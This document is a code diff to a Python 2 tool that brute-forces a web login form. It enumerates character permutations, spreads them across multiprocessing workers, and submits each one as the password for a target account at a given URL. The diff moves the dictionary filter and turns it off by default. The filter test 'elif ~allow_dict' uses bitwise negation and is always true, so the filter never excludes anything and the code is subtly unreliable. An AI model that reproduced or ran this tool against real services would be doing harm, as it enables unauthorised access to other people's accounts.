@@ -2,8 +2,8 @@ import itertools, urllib, urllib2, sys, multiprocessing, os, signal, enchant
 
 chunk_size = 50000
 allow_number = True
-allow_uppercase = False
-allow_dict = True
+allow_uppercase = True
+allow_dict = False
 
 dictstring = 'abcdefghijklmnopqrstuvwxyz_'
 
@@ -18,15 +18,32 @@ if allow_uppercase:
 uk = enchant.Dict("en_UK")
 us = enchant.Dict("en_US")
 
-def brute(i, url = '', form = 'account', form1 = 'password', account = ''):
+def process(temp,url,form,form1,account):
     jobs = []
-    t = list(itertools.permutations(dictstring, i))
-    t = chunks(t, chunk_size)
-    for s in t:
-    	p = multiprocessing.Process(target=work, args=(s,url,form,form1,account,))
-    	jobs.append(p)
-    	p.start()
-    	pass
+    p = multiprocessing.Process(target=work, args=(temp,url,form,form1,account,))
+    jobs.append(p)
+    p.start()
+    pass
+
+def brute(i, url = '', form = 'account', form1 = 'password', account = ''):
+    temp = []
+    tt = 0
+    for l in itertools.permutations(dictstring, i):
+        if allow_dict and filter_dict(l):
+            temp.append(l)
+        elif ~allow_dict:
+            temp.append(l)
+            pass
+        if len(temp) > chunk_size:
+            process(temp,url,form,form1,account)
+            del temp[:]
+            pass
+        pass
+
+    if len(temp)>0:
+        process(temp,url,form,form1,account)
+        del temp[:]
+        pass
     pass
 
 if __name__ == '__main__':
@@ -63,13 +80,7 @@ if __name__ == '__main__':
 def work(res, url, form, form1, account):
     for n in res:
         password = ''.join(n)
-        if allow_dict and filter_dict(password):
-            send(url, form, form1, account, password)
-        elif ~allow_dict:
-            send(url, form, form1, account, password)
-        else:
-            continue
-            pass
+        send(url, form, form1, account, password)
         pass
     pass
 
